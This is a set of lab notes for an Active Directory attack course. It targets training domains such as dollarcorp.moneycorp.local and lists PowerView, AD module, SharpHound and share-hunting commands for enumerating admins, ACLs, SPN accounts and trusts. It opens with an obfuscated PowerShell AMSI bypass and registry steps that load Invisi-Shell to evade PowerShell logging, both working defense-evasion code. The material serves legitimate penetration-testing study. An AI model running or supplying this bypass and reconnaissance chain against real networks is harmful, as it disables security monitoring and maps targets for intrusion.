### SUMMARY 
- [Learning Objective 1](#Learning-Objective-1)
- [Learning Objective 2](#Learning-Objective-2)
- [Learning Objective 3](#Learning-Objective-3)
- [Learning Objective 4](#Learning-Objective-4)

### AMSI bypass
```
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

### PowerView Commands
```
##PowerView.ps1
#Get Domain Information, Retrieves information about the current domain.
Get-NetDomain

#Enumerate Domain Controllers
Get-NetDomainController

#Lists all Domain Controllers in the current domain, List Domain Users
Get-NetUser

#Displays all users in the domain, along with detailed attributes, Find High-Value Targets
Get-NetUser -AdminCount 1

#Lists all users flagged as administrators, Enumerate Domain Groups
Get-NetGroup

#Retrieves all domain groups. Lists members of the "Domain Admins" group.
Get-NetGroupMember -GroupName "Domain Admins"

#Locate Domain Computers. Lists all computers in the domain.
Get-NetComputer

#Analyze Trust Relationships. Displays trust relationships between domains.
Get-NetDomainTrust

#Check ACLs on AD Objects. Shows ACLs for a specific user account, resolving GUIDs to human-readable names.
Get-ObjectAcl -SamAccountName "Administrator" -ResolveGUIDs

#Find Shares on Domain Computers. Locates shared folders across domain computers.
Invoke-ShareFinder

#Identify Delegation Configurations. Finds user accounts with Service Principal Names (SPNs), often used in Kerberos-based attacks.
Get-NetUser -SPN

#-------------------------------------------
#Enumerate ACL/ACE using PowerView

#Get the ACLs associated with the specified object
Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs

#Get the ACLs associated with the specified prefix to be used for search
Get-DomainObjectAcl -SearchBase "LDAP://CN=DomainAdmins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose

#Get the ACLs associated for Domain Admins
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose

#Analyze Trust Relationships (Displays trust relationships between domains)
Get-NetDomainTrust

#Check ACLs on AD Objects  (Shows ACLs for a specific user account, resolving GUIDs to human-readable names)
Get-ObjectAcl -SamAccountName "Administrator" -ResolveGUIDs

#Search for interesting ACEs
Find-InterestingDomainAcl -ResolveGUIDs

#Get ACLs where studentx has interesting permissions
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student867"}

#Get the ACLs associated with the specified path
Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"

#-------------------------------------------
#GPO Enumeration
#Get list of GPO in current domain
Get-DomainGPO
Get-DomainGPO | select displayname
Get-DomainGPO -ComputerIdentity dcorp-student1

#Get GPOs which use Restricted Groups or groups.xml for interesting users
Get-DomainGPOLocalGroup

#Get users which are in a local group of a machine using GPO
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity dcorp-student1

#Get machines where the given user is member of a specific group
Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose

#Get OUs in a domain
Get-DomainOU
Get-ADOrganizationalUnit -Filter * -Properties *

#List all the computers in the DevOps OU
(Get-DomainOU -Identity DevOps).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name

#Get GPO applied on an OU, read GPOname from gplink attribute from Get-NetOU
Get-DomainGPO -Identity "{0D1CC23D-1F20-4EEE...........}"
#Enumerate GPO applied on the DevOps OU
#To enumerate GPO applied on the DevOps OU, we need the name of the policy from the gplink attribute from the OU:
(Get-DomainOU -Identity DevOps).gplink
[LDAP://cn={0BF8D01C-1F62-4BDC-958C-57140B67D147},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]
#Copy the value between {} including the brackets as well:  {0BF8D01C-1F62-4BDC-958C-57140B67D147}
Get-DomainGPO -Identity '{0BF8D01C-1F62-4BDC-958C-57140B67D147}'
#Or Enumerate GPO for DevOps OU in a unique command
Get-DomainGPO -Identity (Get-DomainOU -Identity DevOps).gplink.substring(11,(Get-DomainOU -Identity DevOps).gplink.length-72)

###Domain Trust Enumeration
##To enumerate domain trusts:
#List all domain trusts for the current domain
Get-DomainTrust
#List trusts for a specific domain
Get-DomainTrust -Domain us.dollarcorp.moneycorp.local
#Using Active Directory module
Get-ADTrust
Get-ADTrust -Identity us.dollarcorp.moneycorp.local
#List external trusts in the current forest
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}

##Forest Enumeration
#To map information about the forest:
#Get details about the current forest
Get-Forest
Get-Forest -Forest eurocorp.local
#Using Active Directory module
Get-ADForest
Get-ADForest -Identity eurocorp.local
#Retrieve all domains in the current forest:
Get-ForestDomain
Get-ForestDomain -Forest eurocorp.local
(Get-ADForest).Domains
#Retrieve all global catalogs for the forest:
Get-ForestGlobalCatalog
Get-ForestGlobalCatalog -Forest eurocorp.local
Get-ADForest | Select-Object -ExpandProperty GlobalCatalogs
#Map forest trust relationships (if any exist):
Get-ForestTrust
Get-ForestTrust -Forest eurocorp.local
#Alternative using Active Directory module
Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
```

### Start a PowerShell session using Invisi-Shell to avoid enhanced logging
```
C:\AD\Tools>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```
```
C:\AD\Tools>set COR_ENABLE_PROFILING=1
C:\AD\Tools>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
C:\AD\Tools>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-
b283c03916db}" /f
The operation completed successfully.
C:\AD\Tools>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-
b283c03916db}\InprocServer32" /f
The operation completed successfully.
C:\AD\Tools>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-
b283c03916db}\InprocServer32" /ve /t REG_SZ /d 
"C:\AD\Tools\InviShell\InShellProf.dll" /f
The operation completed successfully.
C:\AD\Tools>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
```

### Load PowerView
```
. C:\AD\Tools\PowerView.ps1
```

### Learning Objective 1
#### Enumerate following for the dollarcorp domain:
* Users
* Computers
* Domain Administrators
* Enterprise Administrators
* Use BloodHound to identify the shortest path to Domain Admins in the dollarcorp domain.
* Find a file share where studentx has Write permissions.

### PowerView
**List informations about all users** 
```
Get-DomainUser
```

**List a specific property of all the users**
```
Get-DomainUser | select -ExpandProperty samaccountname
```

**Enumerate member computers**
```
Get-DomainComputer | select -ExpandProperty dnshostname
```

**See details of the Domain Admins group**
```
Get-DomainGroup -Identity "Domain Admins"
```

**Enumerate members of the Domain Admins group**
```
Get-DomainGroupMember -Identity "Domain Admins"
```

**Enumerate members of the Enterprise Admins group**
```
Get-DomainGroupMember -Identity "Enterprise Admins"
```

**Query the root domain as Enterprise Admins group is present only in the root of a forest**
```
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
```
### ADModule
```
Import-Module C:\AD\Tools\ADModulemaster\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModulemaster\ActiveDirectory\ActiveDirectory.psd1

Get-ADUser -Filter *
Get-ADUser -Filter * -Properties *| select Samaccountname,Description
Get-ADComputer -Filter *
Get-ADGroupMember -Identity 'Domain Admins'
Get-ADGroupMember -Identity 'Enterprise Admins' -Server moneycorp.local
```

### BloodHound ingestores
```
C:\AD\Tools\BloodHound-master\BloodHoundmaster\Collectors\SharpHound.exe --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets --excludedcs
```

### PowerHuntShares
```
Import-Module C:\AD\Tools\PowerHuntShares.psm1
Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt

[*][12/24/2024 04:02] - All files written to C:\AD\Tools\\SmbShareHunt12242024040138
```



### Learning Objective 2
#### Enumerate following for the dollarcorp domain:
* ACL for the Domain Admins group
* ACLs where studentx has interesting permissions
* Analyze the permissions for studentx in BloodHound UI

**Enumerate ACLs for the Domain Admins Group**
```
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
```

**check for modify rights/permissions for the studentx**
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studentx"} 
```

**Check permissions on RDPUsers group**
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

### Learning Objective 4
**Enumerate all domains in the moneycorp.local forest** 
* Map the trusts of the dollarcorp.moneycorp.local domain.
* Map External trusts in moneycorp.local forest. 
* Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?

### PowerView

**Enumerate all domains in the current forest**
```
Get-ForestDomain -Verbose
```

**Map all the trusts of the dollarcorp domain**
```
Get-DomainTrust
```

**List only the external trusts**
```
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

**Identify external trusts of the dollarcorp domain**
```
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

**Since the above is a Bi-Directional trust, we can extract information from the eurocorp.local forest**
```
Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
```


## Using Active Directory module
```
(Get-ADForest).Domains
Get-ADTrust -Filter *
Get-ADForest | %{Get-ADTrust -Filter *}
(Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_}
Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)'
Get-ADTrust -Filter * -Server eurocorp.local
```



